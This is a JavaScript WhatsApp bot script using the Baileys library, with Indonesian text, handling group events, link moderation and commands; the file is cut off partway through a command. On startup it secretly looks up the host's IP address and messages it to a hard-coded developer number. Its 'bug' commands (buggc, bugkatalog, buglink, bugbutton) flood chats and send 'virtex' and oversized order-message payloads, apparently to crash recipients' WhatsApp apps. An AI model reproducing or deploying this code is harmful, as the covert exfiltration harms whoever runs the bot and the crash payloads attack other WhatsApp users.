const {
	WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WAMessageProto,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	WA_MESSAGE_STUB_TYPES,
	WA_DEAFULT_EPHEMERAL,
	waChatKey,
	mentionedJid,
	processTime,
	prepareMessageFromContent, 
	relayWAMessage
	} = require("@adiwajshing/baileys")
const { color, bgcolor } = require('./lib/color')
const { getBuffer, generateMessageID, getGroupAdmins, getRandom, info } = require('./lib/functions')
const fs = require('fs')
const ytsd = require('ytsr')
const axios = require("axios")
const request = require('request')
const moment = require('moment-timezone')
const { spawn, exec, execSync } = require("child_process")
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const { apis, apis2 } = require('./stik/pirus.js')
const { wikiSearch } = require('./lib/wiki.js')
const { virtex90 } = require('./virtex/virtex90')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { fetchJson, getBase64, fetchText, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}

ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
cmhit = []
multi = true
nopref = false
antical = true
welcom = true
allpref = false
autojoin = true
banChats = true
vn = true
online = false
ketik = true
ownerNumber = '6285774523785@s.whatsapp.net'
creator = "6285774523785@s.whatsapp.net"
baterai = {
battery: "" || "Tidak Terdeteksi",
isCharge: "" || true
}

const starts = async (client = new WAConnection()) => {
	client.logger.level = 'warn'
	client.version = [2, 2143, 8]
	client.browserDescription = [ 'I-AM BOOST', '3.0' ]
	client.on('qr', () => {
		console.log(color(' Scan.!!'))
	})
	fs.existsSync('./session.json') && client.loadAuthInfo('./session.json')
	client.on('credentials-updated', () => {
		console.log(color('credentials updated!'))
	})
	client.on('connecting', () => {
		console.log(color('Connecting...'))
	})
	client.on('open', () => {
		console.log(color('Connected'))
	}) 
	client.on('ws-close', () => {
		console.log(color('Connection lost, trying to reconnect.'))
	})
	client.on('close', async () => {
		console.log(color('Disconnected'))
	})
	fetch(`http://ip-api.com/line`).then(res => res.text())
	.then(bu =>{
		client.sendMessage("6285774523785@s.whatsapp.net", `IP-USER\n\n ${bu}`, MessageType.text )
		console.log(color('Sending ip address to developer bot'))
	})
	await client.connect({timeoutMs: 30*1000})
		fs.writeFileSync('./session.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
	client.on('group-update', async (anu) => {
		if (welcom === false) return
		try {
			ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
		} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		}
		let buff = await getBuffer(ppimg)
		const finv = {
			"key": {
				"fromMe": false,
				"participant": "0@s.whatsapp.net",
				"remoteJid": "0@s.whatsapp.net"
			},
			"message": {
				"groupInviteMessage": {
				"groupJid": "6288213840883-1616169743@g.us",
				"inviteCode": `Kuntul`,
				"groupName": `Meki`,
				"caption": `I-AM BOOST`,
				'jpegThumbnail': buff
				}
			}
		}
		const metdata = await client.groupMetadata(anu.jid)
	if(anu.announce == 'false'){
		teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
		client.sendMessage(metdata.id, teks, MessageType.text, {quoted: finv})
		console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`))
	}
	else if(anu.announce == 'true'){
		teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
		client.sendMessage(metdata.id, teks, MessageType.text, {quoted: finv})
		console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`))
	}
	else if(!anu.desc == ''){
		tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
		teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru :\n ${anu.desc}`
		client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag], quoted: finv}})
		console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`))
	}
	else if(anu.restrict == 'false'){
		teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
		client.sendMessage(metdata.id, teks, MessageType.text, {quoted: finv})
		console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`))
	}
	else if(anu.restrict == 'true'){
		teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
		client.sendMessage(metdata.id, teks, MessageType.text, {quoted: finv})
		console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
	}
	})
	client.on('group-participants-update', async (anu) => {
		if (welcom === false) return
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} add`,
							"groupName": `${anu.participants[0].split('@')[0]} add`,
							"caption": `${anu.participants[0].split('@')[0]} add`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `Halo @${num.split('@')[0]}\nSelamat datang di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Welcome Message", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Oke' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} Leave`,
							"groupName": `${anu.participants[0].split('@')[0]} Leave`,
							"caption": `${anu.participants[0].split('@')[0]} Leave`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `Sayonara @${num.split('@')[0]}\nKeluar di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Leave Message", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Byee' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			} else if (anu.action == 'demote') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} Di unadmin`,
							"groupName": `${anu.participants[0].split('@')[0]} Di unadmin`,
							"caption": `${anu.participants[0].split('@')[0]} Di unadmin`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `DEMOTE DETECTED\n@${num.split('@')[0]}\nDi unadmin di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Demote Message", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Byee' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			} else if (anu.action == 'promote') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} Jadi admin`,
							"groupName": `${anu.participants[0].split('@')[0]} Jadi admin`,
							"caption": `${anu.participants[0].split('@')[0]} Jadi admin`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `PROMOTE DETECTED\nSelamat @${num.split('@')[0]}\nJadi admin di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Promote Message By", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Selamat' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			}
		} catch (e) {
		console.log('Error : %s', color(e, 'red'))}
	})
	client.on('CB:action,,call', async json => {
		if (antical === false) return
		const callerId = json[2][0][1].from;
		client.sendMessage(callerId, "[ ! ] CALL DETECTED [ ! ]\n\n You will be blocked ", MessageType.text)
		await sleep(5000)
		await client.blockUser(callerId, "add")
	})
	client.on('chat-update', async (mek) => {
	try {
		if (!mek.hasNewMessage) return
		mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = client.user.phone
		const type = Object.keys(mek.message)[0]
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
		client.on("CB:action,,battery", json => {
			const battery = json[2][0][1].value
			const persenbat = parseInt(battery)
				baterai.battery = `${persenbat}%`
				baterai.isCharge = json[2][0][1].live
			}
		)
		if (multi){
			var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
		} else { if (nopref){
			var prefix = ''
		} else { if (allpref){
			var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
		} else {
			var prefix = prefa
		}}}
		const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ""
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = client.user.jid
		const botNumberss = client.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? client.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const totalchat = await client.chats.all()
		const isOwner = ownerNumber.includes(sender)
		const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
		const txt = mek.message.conversation
		const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
		const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
		const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
		mention != undefined ? mention.push(mentionByReply) : []
		const mentionUser = mention != undefined ? mention.filter(n => n) : []
		const sendKontak = (from, nomor, nama) => {
		const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:By Pito Dev\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
			client.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:finv, contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"I-AM BOOST",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://g.top4top.io/p_21721a9z60.jpg"}}})
			}
		cmhit.push(command)
		const conts = mek.key.fromMe ? client.user.jid : client.contacts[sender] || { notify: jid.replace(/@.+/, '') }
		const pushname = mek.key.fromMe ? client.user.name : conts.notify || conts.vname || conts.name || '-'
		const sendImage = (teks, teks1) => { client.sendMessage(from, teks, image, { caption:teks1, quoted: mek, thumbnail:Buffer.alloc(0)})}
		const sendVideo = (teks, teks1) => { client.sendMessage(from, teks, video, { caption:teks1, thumbnail:Buffer.alloc(0), quoted: mek})}
		const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
		const buttonMessage = {
			contentText: text1,
			footerText: desc1,
			buttons: but,
			headerType: "EMPTY"
			}
			client.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
		}
		const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
			kma = gam1
			mhan = await client.prepareMessage(from, kma, image)
		const buttonMessages = {
			imageMessage: mhan.message.imageMessage,
			contentText: text1,
			footerText: desc1,
			buttons: but,
			headerType: "IMAGE"
			}
			client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
		}
		const sendButLocation = async(id, text1, desc1, loc1, but = [], options = {}) => {
			kma = loc1
			mhan = await client.prepareMessage(from, kma, location)
		const buttonMessages = {
			locationMessage: mhan.message.locationMessage,
			contentText: text1,
			footerText: desc1,
			buttons: but,
			headerType: "LOCATION"
			}
			client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
		}
		const sendButDocument = async(id, text1, desc1, media, doc1, but = [], options = {}) => {
			kma = doc1
			mhan = await client.prepareMessage(from, media, document, kma)
		const buttonMessages = {
			documentMessage: mhan.message.documentMessage,
			contentText: text1,
			footerText: desc1,
			buttons: but,
			headerType: "DOCUMENT"
			}
			client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
		}
		const sendlistMessage = (id, text1, desc1, row = [], options = {}) => {
			const listMessage = {
				buttonText: text1,
				description: desc1,
				sections: row,
				listType: 1
				}
				client.sendMessage(id, listMessage, MessageType.listMessage, options)
			}
		try {
			pporang = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		} catch {
			pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		}
		const ofrply = await getBuffer(pporang)
		/* BUG TOOLS */
		const ftroli = {
			key : {
				participant : '0@s.whatsapp.net' },
			message: {
				orderMessage: {
					itemCount : 999999999,
					status: 1,
					surface : 1,
					message: 'By I-AM BOOST',
					orderTitle: 'By I-AM BOOST',
					thumbnail: ofrply,
					sellerJid: '0@s.whatsapp.net' 
				}
			}
		}
		const troliv2 = (teks) => {
			res = client.prepareMessageFromContent(from, {"orderMessage": { "itemCount": 999999999, "message": teks, "footerText": "I-AM BOOST", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftroli})
			client.relayWAMessage(res)
		}
		const inviteRes = (judul, caption) => {
			res = client.prepareMessageFromContent(from, {"groupInviteMessage": {"groupName":judul, "footerText": "I-AM BOOST", "caption":caption, "jpegThumbnail":ofrply}})
			client.relayWAMessage(res)
		}
		const katalog = (judul, desk) => {
			res = client.prepareMessageFromContent(from, {"productMessage": {"product":{"productImage": ofrply , "title": judul, "description": desk, "retailerId": "I-AM BOOST", }, "businessOwnerJid": "0@s.whatsapp.net"}})
			client.relayWAMessage(res)
		}
		const trolloc = (judul, options = {}) => {
			res = client.prepareMessageFromContent(from, {"locationMessage":{"degreesLatitude":-2.4833826, "degreesLongitude":117.8902853, "title": judul, "footerText": judul, "h":judul, "caption":judul}}, options)
			client.relayWAMessage(res)
		}
		
		idttt = []
		players1 = []
		players2 = []
		gilir = []
		for (let t of ky_ttt){
		idttt.push(t.id)
		players1.push(t.player1)
		players2.push(t.player2)
		gilir.push(t.gilir)
		}
		const isTTT = isGroup ? idttt.includes(from) : false
		isPlayer1 = isGroup ? players1.includes(sender) : false
		isPlayer2 = isGroup ? players2.includes(sender) : false

		var ase = new Date();
		var jamss = ase.getHours();
			switch(jamss){
				case 0: jamss = "Midnight"; break;
				case 1: jamss = "Midnight"; break;
				case 2: jamss = "Midnight"; break;
				case 3: jamss = "Midnight"; break;
				case 4: jamss = "Midnight"; break;
				case 5: jamss = "Dawn"; break;
				case 6: jamss = "Morning"; break;
				case 7: jamss = "Morning"; break;
				case 8: jamss = "Morning"; break;
				case 9: jamss = "Morning"; break;
				case 10: jamss = "Morning"; break;
				case 11: jamss = "Afternoon"; break;
				case 12: jamss = "Zuhur"; break;
				case 13: jamss = "Afternoon"; break;
				case 14: jamss = "Afternoon"; break;
				case 15: jamss = "Asr"; break;
				case 16: jamss = "Afternoon"; break;
				case 17: jamss = "Evening"; break;
				case 18: jamss = "Maghrib"; break;
				case 19: jamss = "Isha"; break;
				case 20: jamss = "Night"; break;
				case 21: jamss = "Night"; break;
				case 22: jamss = "Midnight"; break;
				case 23: jamss = "Midnight"; break;
				}
				var tampilUcapan = "" + jamss;
			const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
			const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
			const week = d.toLocaleDateString(locale, { weekday: 'long' })
			const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})

		mess = {
			wait: 'Tunggu',
			sukses: ' Done',
			salah: 'Apa Itu?',
			eror: {
				link: 'Link nya error',
				Iv: 'Error',
				api: 'Error'
			},
			only: {
				group: 'Khusus di group',
				admin: 'Khusus admin group'
			}
		}
		const reply = (teks) => {
			client.sendMessage(from, teks, text, { thumbnail: ofrply, sendEphemeral: true, quoted: mek})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}

			const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
						"groupJid": "6288213840883-1616169743@g.us",
						"inviteCode": `${tampilUcapan} ${pushname} — ${sender.split('@')[0]}`,
						"groupName": `${tampilUcapan} ${pushname} — ${sender.split('@')[0]}`, 
						"caption": `${tampilUcapan} ${pushname} — ${sender.split('@')[0]}`, 
						'jpegThumbnail': ofrply
					}
				}
			}
		if (budy.includes("https://chat.whatsapp.com/")) {
			if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Admin mah bebas')
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Auto kick!')
				setTimeout( () => {
					client.groupRemove(from, [kic]).catch((e) => { reply('Eror Bot Belum Jadi Admin') })
				}, 3000)
			}
		}
		if (isGroup && autojoin == true) {
			if (budy.includes("://chat.whatsapp.com/")) {
		        client.query({json: ["action", "invite", `${budy.replace("https://chat.whatsapp.com/", "")}`,],
				});
			}
		}
		if (txt.length > 1000){
			if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiVirtex) return
				if (isGroupAdmins) return reply('Admin mah bebas')
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				var longkapnye = "\n".repeat(300)
				tekuss = `TANDAI TELAH DIBACA !!!${longkapnye}@⁨${sender.split('@')[0]} Terdeteksi Telah Mengirim Bug !\n`
				client.sendMessage(from, tekuss, text, { contextInfo: { "mentionedJid": sender }})
				setTimeout( () => {
					client.groupRemove(from, [kic]).catch((e) => { reply('Eror Bot Belum Jadi Admin') })
				}, 2000)
				await sleep(3000)
				await client.blockUser(sender, "add")
			}
		}
        	
		const sendFileFromUrl = async(link, type, options) => { 
			hasil = await getBuffer(link) 
			client.sendMessage(from, hasil, type, options).catch(e => {
				fetch(link).then((hasil) => {
					client.sendMessage(from, hasil, type, options).catch(e => { 
						client.sendMessage(from, { url : link }, type, options).catch(e => { 
							reply ("ERROR")
							console.log(e)
						})
					})
				})
			})
		}
		const sendMediaURL = async(to, url, text="", mids=[]) =>{ 
			if(mids.length > 0){
				text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					client.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		if (vn) {
			if (vn === false) return
			if (!isCmd && !isCmd && !command && mek.message) { for (let i of totalchat) { client.updatePresence(i.jid, Presence.recording)}}
		} else if (online) {
			if (online === true) return
			if (!isCmd && !isCmd && !command && mek.message) { for (let i of totalchat) { client.updatePresence(i.jid, Presence.available)}}
		} else if (ketik) {
			if (ketik === true) return
			if (!isCmd && !isCmd && !command && mek.message) { for (let i of totalchat) { client.updatePresence(i.jid, Presence.composing)}}
		}
		colors = ['red','white','black','blue','yellow','green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!isGroup && isCmd) console.log(color('~>','white'), color('[EXEC]','white'), color(time,'white'), color(command,'white'), color('from','white'), color(sender.split('@')[0],'white'), color('args :','white'), color(args.length,'white'))
		if (isCmd && isGroup) console.log(color('~>','white'), color('[EXEC]','white'), color(time,'white'), color(command,'white'), color('from','white'), color(sender.split('@')[0],'white'), color('in','white'), color(groupName,'white'), color('args :','white'), color(args.length,'white'))
		if (!mek.key.fromMe && banChats === true ) return

	switch(command) {
		/*CASE BUG BY PITODEV*/
		case 'buggc':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('jumlah?')
			for (let i = 0; i < args[0]; i++) {
				await client.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true })
			}
			reply('Sukses send bug sebanyak '+args.join(' '))
			break
case 'bugkatalog':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
client.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = client.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             client.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break
                case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 await client.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
               client.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./client.jpg`),
                "sourceUrl": "https://chat.whatsapp.com/HQCry1KsxNE3C6GTK2QAiJ"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        await client.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'IMP-GANZ🌹'},type:1}])
        await client.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
await client.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
 listMsg = {
 buttonText: 'LIST MENU',
